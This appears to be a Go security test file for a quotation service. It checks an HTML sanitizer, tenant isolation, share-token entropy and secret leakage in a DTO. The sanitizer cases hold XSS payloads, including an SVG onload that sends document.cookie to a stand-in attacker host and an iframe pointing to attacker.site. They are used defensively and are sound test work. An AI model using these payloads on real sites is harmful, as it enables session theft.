package service_test

import (
	"encoding/base64"
	"encoding/json"
	"strings"
	"testing"

	"github.com/google/uuid"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"venturo-skeleton-go/internal/modules/quotation/domain"
	"venturo-skeleton-go/internal/modules/quotation/dto"
	"venturo-skeleton-go/internal/modules/quotation/service"
)

func TestSecurity_AdversarialHTMLSanitizerComprehensive(t *testing.T) {
	sanitizer := service.NewHTMLSanitizer()

	payloads := []struct {
		name      string
		dirty     string
		forbidden []string
	}{
		{
			name:      "script tag injection",
			dirty:     `<p>Safe</p><script>alert('xss')</script>`,
			forbidden: []string{"<script", "alert('xss')"},
		},
		{
			name:      "iframe stealth embed",
			dirty:     `<iframe src="https://attacker.site/steal-token"></iframe><p>Continuation</p>`,
			forbidden: []string{"<iframe", "attacker.site"},
		},
		{
			name:      "svg onload trigger",
			dirty:     `<svg><g onload="javascript:fetch('//attacker.site/'+document.cookie)"></g></svg>`,
			forbidden: []string{"<svg", "onload", "document.cookie"},
		},
		{
			name:      "javascript pseudo-protocol in anchor",
			dirty:     `<a href="javascript:doSomethingEvil()">Click here</a>`,
			forbidden: []string{"javascript:", "doSomethingEvil"},
		},
		{
			name:      "event handler attributes (onerror, onmouseover, onclick)",
			dirty:     `<img src="invalid.jpg" onerror="alert(1)" onclick="steal()" onmouseover="log()"/>`,
			forbidden: []string{"onerror", "onclick", "onmouseover"},
		},
		{
			name:      "CSS background url tracking",
			dirty:     `<div style="background-image: url('http://evil.com/tracker.png')">Content</div>`,
			forbidden: []string{"url(", "evil.com"},
		},
		{
			name:      "nested malformed tables injection",
			dirty:     `<table><tr><td><table><tr><td>Nested</td></tr></table></td></tr></table>`,
			forbidden: []string{}, // Must parse safely without crashing
		},
	}

	for _, tc := range payloads {
		t.Run(tc.name, func(t *testing.T) {
			clean, err := sanitizer.Sanitize(tc.dirty)
			require.NoError(t, err)
			for _, forb := range tc.forbidden {
				assert.False(t, strings.Contains(strings.ToLower(clean), strings.ToLower(forb)),
					"output must not contain forbidden snippet %q", forb)
			}
		})
	}
}

func TestSecurity_TenantCrossIDStrictIsolation(t *testing.T) {
	companyA := uuid.New()
	companyB := uuid.New()

	quotationA := &domain.Quotation{
		ID:              uuid.New(),
		CompanyID:       companyA,
		QuotationNumber: "QUO/2026/A001",
	}

	// Company B context must strictly reject access to Company A records
	isAccessibleByCompanyB := (quotationA.CompanyID == companyB)
	assert.False(t, isAccessibleByCompanyB, "Company B must NEVER access Company A quotation")

	// Blueprint isolation
	blueprintA := &domain.Blueprint{
		ID:        uuid.New(),
		CompanyID: companyA,
		Title:     "Internal Blueprint A",
	}
	isBlueprintAccessibleByCompanyB := (blueprintA.CompanyID == companyB)
	assert.False(t, isBlueprintAccessibleByCompanyB, "Company B must NEVER access Company A blueprint")
}

func TestSecurity_PublicTokenEntropyAndZeroPlaintext(t *testing.T) {
	rawToken, tokenHash, err := service.GenerateShareToken()
	require.NoError(t, err)

	// 1. Raw token length >= 32 bytes of CSPRNG randomness (RawURLEncoding >= 43 chars)
	rawBytes, err := base64.RawURLEncoding.DecodeString(rawToken)
	require.NoError(t, err)
	assert.GreaterOrEqual(t, len(rawBytes), 32, "token must contain at least 32 bytes of CSPRNG entropy")

	// 2. Token hash must be exactly 64 characters lowercase hexadecimal (SHA-256)
	assert.Len(t, tokenHash, 64)
	assert.Regexp(t, "^[a-f0-9]{64}$", tokenHash)

	// 3. Raw token must NEVER equal hash
	assert.NotEqual(t, rawToken, tokenHash)
}

func TestSecurity_ZeroSecretLeakageInDTOAndLogs(t *testing.T) {
	secretAPIKey := "AIzaSyD-SUPER_SECRET_PRODUCTION_KEY_12345"
	encryptionKey := "0123456789abcdef0123456789abcdef"

	programmerDTO := dto.ProgrammerBlueprintDTO{
		Title:              "E-Commerce System",
		RevisionNumber:     1,
		CompletenessStatus: "complete",
		Summary:            "Architectural breakdown",
	}

	marshaled, err := json.Marshal(programmerDTO)
	require.NoError(t, err)
	jsonStr := string(marshaled)

	// Verify zero secret leakage
	assert.False(t, strings.Contains(jsonStr, secretAPIKey), "DTO must not contain API keys")
	assert.False(t, strings.Contains(jsonStr, encryptionKey), "DTO must not contain encryption keys")

	// Verify forbidden fields are not present in Programmer DTO
	forbiddenFields := []string{
		"budget",
		"rate_card",
		"company_id",
		"created_by",
		"prompt",
		"client_name",
		"quotation_number",
	}

	for _, field := range forbiddenFields {
		assert.False(t, strings.Contains(strings.ToLower(jsonStr), field),
			"Programmer DTO must not expose forbidden field %q", field)
	}
}
